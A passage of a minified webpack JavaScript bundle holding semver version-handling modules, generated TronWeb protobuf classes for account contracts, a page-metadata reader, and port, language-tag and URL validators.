                        }
                    }
                    return ""
                }
                const o = function() {
                    let t = r("name", "og:site_name", "og:title", "twitter:title");
                    return t || (t = e.title),
                    t
                }();
                return {
                    description: r("description", "og:description", "twitter:description", "keywords"),
                    url: t.origin,
                    icons: function() {
                        const r = e.getElementsByTagName("link")
                          , n = [];
                        for (let e = 0; e < r.length; e++) {
                            const o = r[e]
                              , i = o.getAttribute("rel");
                            if (i && i.toLowerCase().indexOf("icon") > -1) {
                                const e = o.getAttribute("href");
                                if (e)
                                    if (-1 === e.toLowerCase().indexOf("https:") && -1 === e.toLowerCase().indexOf("http:") && 0 !== e.indexOf("//")) {
                                        let r = t.protocol + "//" + t.host;
                                        if (0 === e.indexOf("/"))
                                            r += e;
                                        else {
                                            const n = t.pathname.split("/");
                                            n.pop();
                                            r += n.join("/") + "/" + e
                                        }
                                        n.push(r)
                                    } else if (0 === e.indexOf("//")) {
                                        const r = t.protocol + e;
                                        n.push(r)
                                    } else
                                        n.push(e)
                            }
                        }
                        return n
                    }(),
                    name: o
                }
            }
        }
        ,
        9355: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e, {
                    allow_leading_zeroes: !1,
                    min: 0,
                    max: 65535
                })
            }
            ;
            var n, o = (n = r(755)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        9379: (e, t, r) => {
            "use strict";
            r.d(t, {
                A: () => i
            });
            var n = r(4705);
            function o(e, t) {
                var r = Object.keys(e);
                if (Object.getOwnPropertySymbols) {
                    var n = Object.getOwnPropertySymbols(e);
                    t && (n = n.filter((function(t) {
                        return Object.getOwnPropertyDescriptor(e, t).enumerable
                    }
                    ))),
                    r.push.apply(r, n)
                }
                return r
            }
            function i(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var r = null != arguments[t] ? arguments[t] : {};
                    t % 2 ? o(Object(r), !0).forEach((function(t) {
                        (0,
                        n.A)(e, t, r[t])
                    }
                    )) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(r)) : o(Object(r)).forEach((function(t) {
                        Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(r, t))
                    }
                    ))
                }
                return e
            }
        }
        ,
        9398: (e, t, r) => {
            const n = r(3338)
              , {MAX_LENGTH: o, MAX_SAFE_INTEGER: i} = r(5132)
              , {safeRe: s, safeSrc: a, t: c} = r(9040)
              , l = r(5525)
              , {compareIdentifiers: u} = r(3029);
            class d {
                constructor(e, t) {
                    if (t = l(t),
                    e instanceof d) {
                        if (e.loose === !!t.loose && e.includePrerelease === !!t.includePrerelease)
                            return e;
                        e = e.version
                    } else if ("string" !== typeof e)
                        throw new TypeError('Invalid version. Must be a string. Got type "'.concat(typeof e, '".'));
                    if (e.length > o)
                        throw new TypeError("version is longer than ".concat(o, " characters"));
                    n("SemVer", e, t),
                    this.options = t,
                    this.loose = !!t.loose,
                    this.includePrerelease = !!t.includePrerelease;
                    const r = e.trim().match(t.loose ? s[c.LOOSE] : s[c.FULL]);
                    if (!r)
                        throw new TypeError("Invalid Version: ".concat(e));
                    if (this.raw = e,
                    this.major = +r[1],
                    this.minor = +r[2],
                    this.patch = +r[3],
                    this.major > i || this.major < 0)
                        throw new TypeError("Invalid major version");
                    if (this.minor > i || this.minor < 0)
                        throw new TypeError("Invalid minor version");
                    if (this.patch > i || this.patch < 0)
                        throw new TypeError("Invalid patch version");
                    r[4] ? this.prerelease = r[4].split(".").map((e => {
                        if (/^[0-9]+$/.test(e)) {
                            const t = +e;
                            if (t >= 0 && t < i)
                                return t
                        }
                        return e
                    }
                    )) : this.prerelease = [],
                    this.build = r[5] ? r[5].split(".") : [],
                    this.format()
                }
                format() {
                    return this.version = "".concat(this.major, ".").concat(this.minor, ".").concat(this.patch),
                    this.prerelease.length && (this.version += "-".concat(this.prerelease.join("."))),
                    this.version
                }
                toString() {
                    return this.version
                }
                compare(e) {
                    if (n("SemVer.compare", this.version, this.options, e),
                    !(e instanceof d)) {
                        if ("string" === typeof e && e === this.version)
                            return 0;
                        e = new d(e,this.options)
                    }
                    return e.version === this.version ? 0 : this.compareMain(e) || this.comparePre(e)
                }
                compareMain(e) {
                    return e instanceof d || (e = new d(e,this.options)),
                    u(this.major, e.major) || u(this.minor, e.minor) || u(this.patch, e.patch)
                }
                comparePre(e) {
                    if (e instanceof d || (e = new d(e,this.options)),
                    this.prerelease.length && !e.prerelease.length)
                        return -1;
                    if (!this.prerelease.length && e.prerelease.length)
                        return 1;
                    if (!this.prerelease.length && !e.prerelease.length)
                        return 0;
                    let t = 0;
                    do {
                        const r = this.prerelease[t]
                          , o = e.prerelease[t];
                        if (n("prerelease compare", t, r, o),
                        void 0 === r && void 0 === o)
                            return 0;
                        if (void 0 === o)
                            return 1;
                        if (void 0 === r)
                            return -1;
                        if (r !== o)
                            return u(r, o)
                    } while (++t)
                }
                compareBuild(e) {
                    e instanceof d || (e = new d(e,this.options));
                    let t = 0;
                    do {
                        const r = this.build[t]
                          , o = e.build[t];
                        if (n("build compare", t, r, o),
                        void 0 === r && void 0 === o)
                            return 0;
                        if (void 0 === o)
                            return 1;
                        if (void 0 === r)
                            return -1;
                        if (r !== o)
                            return u(r, o)
                    } while (++t)
                }
                inc(e, t, r) {
                    if (e.startsWith("pre")) {
                        if (!t && !1 === r)
                            throw new Error("invalid increment argument: identifier is empty");
                        if (t) {
                            const e = new RegExp("^".concat(this.options.loose ? a[c.PRERELEASELOOSE] : a[c.PRERELEASE], "$"))
                              , r = "-".concat(t).match(e);
                            if (!r || r[1] !== t)
                                throw new Error("invalid identifier: ".concat(t))
                        }
                    }
                    switch (e) {
                    case "premajor":
                        this.prerelease.length = 0,
                        this.patch = 0,
                        this.minor = 0,
                        this.major++,
                        this.inc("pre", t, r);
                        break;
                    case "preminor":
                        this.prerelease.length = 0,
                        this.patch = 0,
                        this.minor++,
                        this.inc("pre", t, r);
                        break;
                    case "prepatch":
                        this.prerelease.length = 0,
                        this.inc("patch", t, r),
                        this.inc("pre", t, r);
                        break;
                    case "prerelease":
                        0 === this.prerelease.length && this.inc("patch", t, r),
                        this.inc("pre", t, r);
                        break;
                    case "release":
                        if (0 === this.prerelease.length)
                            throw new Error("version ".concat(this.raw, " is not a prerelease"));
                        this.prerelease.length = 0;
                        break;
                    case "major":
                        0 === this.minor && 0 === this.patch && 0 !== this.prerelease.length || this.major++,
                        this.minor = 0,
                        this.patch = 0,
                        this.prerelease = [];
                        break;
                    case "minor":
                        0 === this.patch && 0 !== this.prerelease.length || this.minor++,
                        this.patch = 0,
                        this.prerelease = [];
                        break;
                    case "patch":
                        0 === this.prerelease.length && this.patch++,
                        this.prerelease = [];
                        break;
                    case "pre":
                        {
                            const e = Number(r) ? 1 : 0;
                            if (0 === this.prerelease.length)
                                this.prerelease = [e];
                            else {
                                let n = this.prerelease.length;
                                for (; --n >= 0; )
                                    "number" === typeof this.prerelease[n] && (this.prerelease[n]++,
                                    n = -2);
                                if (-1 === n) {
                                    if (t === this.prerelease.join(".") && !1 === r)
                                        throw new Error("invalid increment argument: identifier already exists");
                                    this.prerelease.push(e)
                                }
                            }
                            if (t) {
                                let n = [t, e];
                                !1 === r && (n = [t]),
                                0 === u(this.prerelease[0], t) ? isNaN(this.prerelease[1]) && (this.prerelease = n) : this.prerelease = n
                            }
                            break
                        }
                    default:
                        throw new Error("invalid increment argument: ".concat(e))
                    }
                    return this.raw = this.format(),
                    this.build.length && (this.raw += "+".concat(this.build.join("."))),
                    this
                }
            }
            e.exports = d
        }
        ,
        9447: (e, t, r) => {
            const n = r(4950);
            e.exports = (e, t, r) => 0 === n(e, t, r)
        }
        ,
        9488: (e, t, r) => {
            const n = r(9398)
              , o = r(2282)
              , {safeRe: i, t: s} = r(9040);
            e.exports = (e, t) => {
                if (e instanceof n)
                    return e;
                if ("number" === typeof e && (e = String(e)),
                "string" !== typeof e)
                    return null;
                let r = null;
                if ((t = t || {}).rtl) {
                    const n = t.includePrerelease ? i[s.COERCERTLFULL] : i[s.COERCERTL];
                    let o;
                    for (; (o = n.exec(e)) && (!r || r.index + r[0].length !== e.length); )
                        r && o.index + o[0].length === r.index + r[0].length || (r = o),
                        n.lastIndex = o.index + o[1].length + o[2].length;
                    n.lastIndex = -1
                } else
                    r = e.match(t.includePrerelease ? i[s.COERCEFULL] : i[s.COERCE]);
                if (null === r)
                    return null;
                const a = r[2]
                  , c = r[3] || "0"
                  , l = r[4] || "0"
                  , u = t.includePrerelease && r[5] ? "-".concat(r[5]) : ""
                  , d = t.includePrerelease && r[6] ? "+".concat(r[6]) : "";
                return o("".concat(a, ".").concat(c, ".").concat(l).concat(u).concat(d), t)
            }
        }
        ,
        9496: (e, t, r) => {
            const n = r(9398)
              , o = r(77);
            e.exports = (e, t, r) => {
                let i = null
                  , s = null
                  , a = null;
                try {
                    a = new o(t,r)
                } catch (c) {
                    return null
                }
                return e.forEach((e => {
                    a.test(e) && (i && 1 !== s.compare(e) || (i = e,
                    s = new n(i,r)))
                }
                )),
                i
            }
        }
        ,
        9526: (e, t, r) => {
            const n = r(2282);
            e.exports = (e, t) => {
                const r = n(e, null, !0)
                  , o = n(t, null, !0)
                  , i = r.compare(o);
                if (0 === i)
                    return null;
                const s = i > 0
                  , a = s ? r : o
                  , c = s ? o : r
                  , l = !!a.prerelease.length;
                if (!!c.prerelease.length && !l) {
                    if (!c.patch && !c.minor)
                        return "major";
                    if (0 === c.compareMain(a))
                        return c.minor && !c.patch ? "minor" : "patch"
                }
                const u = l ? "pre" : "";
                return r.major !== o.major ? u + "major" : r.minor !== o.minor ? u + "minor" : r.patch !== o.patch ? u + "patch" : "prerelease"
            }
        }
        ,
        9558: (e, t, r) => {
            var n = r(7248)
              , o = n
              , i = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof window && window || "undefined" !== typeof i && i || "undefined" !== typeof self && self || function() {
                return this
            }
            .call(null) || Function("return this")()
              , s = r(1184);
            o.object.extend(proto, s),
            o.exportSymbol("TronWebProto.AccountCreateContract", null, i),
            o.exportSymbol("TronWebProto.AccountPermissionUpdateContract", null, i),
            o.exportSymbol("TronWebProto.AccountUpdateContract", null, i),
            o.exportSymbol("TronWebProto.SetAccountIdContract", null, i),
            TronWebProto.AccountCreateContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.AccountCreateContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AccountCreateContract.displayName = "TronWebProto.AccountCreateContract"),
            TronWebProto.AccountUpdateContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.AccountUpdateContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AccountUpdateContract.displayName = "TronWebProto.AccountUpdateContract"),
            TronWebProto.SetAccountIdContract = function(e) {
                n.Message.initialize(this, e, 0, -1, null, null)
            }
            ,
            o.inherits(TronWebProto.SetAccountIdContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.SetAccountIdContract.displayName = "TronWebProto.SetAccountIdContract"),
            TronWebProto.AccountPermissionUpdateContract = function(e) {
                n.Message.initialize(this, e, 0, -1, TronWebProto.AccountPermissionUpdateContract.repeatedFields_, null)
            }
            ,
            o.inherits(TronWebProto.AccountPermissionUpdateContract, n.Message),
            o.DEBUG && !COMPILED && (TronWebProto.AccountPermissionUpdateContract.displayName = "TronWebProto.AccountPermissionUpdateContract"),
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountCreateContract.prototype.toObject = function(e) {
                return TronWebProto.AccountCreateContract.toObject(e, this)
            }
            ,
            TronWebProto.AccountCreateContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    accountAddress: t.getAccountAddress_asB64(),
                    type: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.AccountCreateContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AccountCreateContract;
                return TronWebProto.AccountCreateContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AccountCreateContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setAccountAddress(r);
                        break;
                    case 3:
                        r = t.readEnum();
                        e.setType(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AccountCreateContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AccountCreateContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AccountCreateContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getAccountAddress_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getType()) && t.writeEnum(3, r)
            }
            ,
            TronWebProto.AccountCreateContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.AccountCreateContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.AccountCreateContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.AccountCreateContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.AccountCreateContract.prototype.getAccountAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.AccountCreateContract.prototype.getAccountAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAccountAddress())
            }
            ,
            TronWebProto.AccountCreateContract.prototype.getAccountAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAccountAddress())
            }
            ,
            TronWebProto.AccountCreateContract.prototype.setAccountAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.AccountCreateContract.prototype.getType = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.AccountCreateContract.prototype.setType = function(e) {
                return n.Message.setProto3EnumField(this, 3, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountUpdateContract.prototype.toObject = function(e) {
                return TronWebProto.AccountUpdateContract.toObject(e, this)
            }
            ,
            TronWebProto.AccountUpdateContract.toObject = function(e, t) {
                var r = {
                    accountName: t.getAccountName_asB64(),
                    ownerAddress: t.getOwnerAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.AccountUpdateContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AccountUpdateContract;
                return TronWebProto.AccountUpdateContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AccountUpdateContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setAccountName(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AccountUpdateContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AccountUpdateContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAccountName_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(2, r)
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.getAccountName = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.getAccountName_asB64 = function() {
                return n.Message.bytesAsB64(this.getAccountName())
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.getAccountName_asU8 = function() {
                return n.Message.bytesAsU8(this.getAccountName())
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.setAccountName = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.AccountUpdateContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.SetAccountIdContract.prototype.toObject = function(e) {
                return TronWebProto.SetAccountIdContract.toObject(e, this)
            }
            ,
            TronWebProto.SetAccountIdContract.toObject = function(e, t) {
                var r = {
                    accountId: t.getAccountId_asB64(),
                    ownerAddress: t.getOwnerAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.SetAccountIdContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.SetAccountIdContract;
                return TronWebProto.SetAccountIdContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.SetAccountIdContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setAccountId(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.SetAccountIdContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.SetAccountIdContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAccountId_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(2, r)
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.getAccountId = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.getAccountId_asB64 = function() {
                return n.Message.bytesAsB64(this.getAccountId())
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.getAccountId_asU8 = function() {
                return n.Message.bytesAsU8(this.getAccountId())
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.setAccountId = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.SetAccountIdContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.repeatedFields_ = [4],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountPermissionUpdateContract.prototype.toObject = function(e) {
                return TronWebProto.AccountPermissionUpdateContract.toObject(e, this)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.toObject = function(e, t) {
                var r, o = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    owner: (r = t.getOwner()) && s.Permission.toObject(e, r),
                    witness: (r = t.getWitness()) && s.Permission.toObject(e, r),
                    activesList: n.Message.toObjectList(t.getActivesList(), s.Permission.toObject, e)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.AccountPermissionUpdateContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.AccountPermissionUpdateContract;
                return TronWebProto.AccountPermissionUpdateContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = new s.Permission;
                        t.readMessage(r, s.Permission.deserializeBinaryFromReader),
                        e.setOwner(r);
                        break;
                    case 3:
                        r = new s.Permission;
                        t.readMessage(r, s.Permission.deserializeBinaryFromReader),
                        e.setWitness(r);
                        break;
                    case 4:
                        r = new s.Permission;
                        t.readMessage(r, s.Permission.deserializeBinaryFromReader),
                        e.addActives(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.AccountPermissionUpdateContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                null != (r = e.getOwner()) && t.writeMessage(2, r, s.Permission.serializeBinaryToWriter),
                null != (r = e.getWitness()) && t.writeMessage(3, r, s.Permission.serializeBinaryToWriter),
                (r = e.getActivesList()).length > 0 && t.writeRepeatedMessage(4, r, s.Permission.serializeBinaryToWriter)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.getOwner = function() {
                return n.Message.getWrapperField(this, s.Permission, 2)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.setOwner = function(e) {
                return n.Message.setWrapperField(this, 2, e)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.clearOwner = function() {
                return this.setOwner(void 0)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.hasOwner = function() {
                return null != n.Message.getField(this, 2)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.getWitness = function() {
                return n.Message.getWrapperField(this, s.Permission, 3)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.setWitness = function(e) {
                return n.Message.setWrapperField(this, 3, e)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.clearWitness = function() {
                return this.setWitness(void 0)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.hasWitness = function() {
                return null != n.Message.getField(this, 3)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.getActivesList = function() {
                return n.Message.getRepeatedWrapperField(this, s.Permission, 4)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.setActivesList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 4, e)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.addActives = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 4, e, TronWebProto.Permission, t)
            }
            ,
            TronWebProto.AccountPermissionUpdateContract.prototype.clearActivesList = function() {
                return this.setActivesList([])
            }
            ,
            o.object.extend(t, TronWebProto)
        }
        ,
        9678: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                d.test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = "(([a-zA-Z]{2,3}(-".concat("([A-Za-z]{3}(-[A-Za-z]{3}){0,2})", ")?)|([a-zA-Z]{5,8}))")
              , s = "(".concat("(\\d|[A-W]|[Y-Z]|[a-w]|[y-z])", "(-[A-Za-z0-9]{2,8})+)")
              , a = "(x(-[A-Za-z0-9]{1,8})+)"
              , c = "(".concat("((en-GB-oed)|(i-ami)|(i-bnn)|(i-default)|(i-enochian)|(i-hak)|(i-klingon)|(i-lux)|(i-mingo)|(i-navajo)|(i-pwn)|(i-tao)|(i-tay)|(i-tsu)|(sgn-BE-FR)|(sgn-BE-NL)|(sgn-CH-DE))", "|").concat("((art-lojban)|(cel-gaulish)|(no-bok)|(no-nyn)|(zh-guoyu)|(zh-hakka)|(zh-min)|(zh-min-nan)|(zh-xiang))", ")")
              , l = "(-|_)"
              , u = "".concat(i, "(").concat(l).concat("([A-Za-z]{4})", ")?(").concat(l).concat("([A-Za-z]{2}|\\d{3})", ")?(").concat(l).concat("([A-Za-z0-9]{5,8}|(\\d[A-Z-a-z0-9]{3}))", ")*(").concat(l).concat(s, ")*(").concat(l).concat(a, ")?")
              , d = new RegExp("(^".concat(a, "$)|(^").concat(c, "$)|(^").concat(u, "$)"));
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        9691: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                n.default)(e),
                !e || /[\s<>]/.test(e))
                    return !1;
                if (0 === e.indexOf("mailto:"))
                    return !1;
                if ((t = (0,
                s.default)(t, l)).validate_length && e.length >= 2083)
                    return !1;
                if (!t.allow_fragments && e.includes("#"))
                    return !1;
                if (!t.allow_query_components && (e.includes("?") || e.includes("&")))
                    return !1;
                var r, a, h, f, p, g, y, m;
                if (y = e.split("#"),
                e = y.shift(),
                y = e.split("?"),
                e = y.shift(),
                (y = e.split("://")).length > 1) {
                    if (r = y.shift().toLowerCase(),
                    t.require_valid_protocol && -1 === t.protocols.indexOf(r))
                        return !1
                } else {
                    if (t.require_protocol)
                        return !1;
                    if ("//" === e.slice(0, 2)) {
                        if (!t.allow_protocol_relative_urls)
                            return !1;
                        y[0] = e.slice(2)
                    }
                }
                if ("" === (e = y.join("://")))
                    return !1;
                if (y = e.split("/"),
                "" === (e = y.shift()) && !t.require_host)
                    return !0;
                if ((y = e.split("@")).length > 1) {
                    if (t.disallow_auth)
                        return !1;
                    if ("" === y[0])
                        return !1;
                    if ((a = y.shift()).indexOf(":") >= 0 && a.split(":").length > 2)
                        return !1;
                    var b = a.split(":")
                      , v = (E = 2,
                    function(e) {
                        if (Array.isArray(e))
                            return e
                    }(A = b) || function(e, t) {
                        var r = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
                        if (null != r) {
                            var n, o, i, s, a = [], c = !0, l = !1;
                            try {
                                if (i = (r = r.call(e)).next,
                                0 === t) {
                                    if (Object(r) !== r)
                                        return;
                                    c = !1
                                } else
                                    for (; !(c = (n = i.call(r)).done) && (a.push(n.value),
                                    a.length !== t); c = !0)
                                        ;
                            } catch (e) {
                                l = !0,
                                o = e
                            } finally {
                                try {
                                    if (!c && null != r.return && (s = r.return(),
                                    Object(s) !== s))
                                        return
                                } finally {
                                    if (l)
                                        throw o
                                }
                            }
                            return a
                        }
                    }(A, E) || function(e, t) {
                        if (e) {
                            if ("string" === typeof e)
                                return c(e, t);
                            var r = Object.prototype.toString.call(e).slice(8, -1);
                            return "Object" === r && e.constructor && (r = e.constructor.name),
                            "Map" === r || "Set" === r ? Array.from(e) : "Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? c(e, t) : void 0
                        }
                    }(A, E) || function() {
                        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
                    }())
                      , w = v[0]
                      , T = v[1];
                    if ("" === w && "" === T)
                        return !1
                }
                var A, E;
                f = y.join("@"),
                g = null,
                m = null;
                var P = f.match(u);
                P ? (h = "",
                m = P[1],
                g = P[2] || null) : (h = (y = f.split(":")).shift(),
                y.length && (g = y.join(":")));
                if (null !== g && g.length > 0) {
                    if (p = parseInt(g, 10),
                    !/^[0-9]+$/.test(g) || p <= 0 || p > 65535)
                        return !1
                } else if (t.require_port)
                    return !1;
                if (t.host_whitelist)
                    return d(h, t.host_whitelist);
                if ("" === h && !t.require_host)
                    return !0;
                if (!(0,
                i.default)(h) && !(0,
                o.default)(h, t) && (!m || !(0,
                i.default)(m, 6)))
                    return !1;
                if (h = h || m,
                t.host_blacklist && d(h, t.host_blacklist))
                    return !1;
                return !0
            }
            ;
            var n = a(r(8804))
              , o = a(r(7891))
              , i = a(r(6581))
              , s = a(r(3975));
            function a(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            function c(e, t) {
                (null == t || t > e.length) && (t = e.length);
                for (var r = 0, n = new Array(t); r < t; r++)
                    n[r] = e[r];
                return n
            }
            var l = {
                protocols: ["http", "https", "ftp"],
                require_tld: !0,
                require_protocol: !1,
                require_host: !0,
                require_port: !1,
                require_valid_protocol: !0,
                allow_underscores: !1,
                allow_trailing_dot: !1,
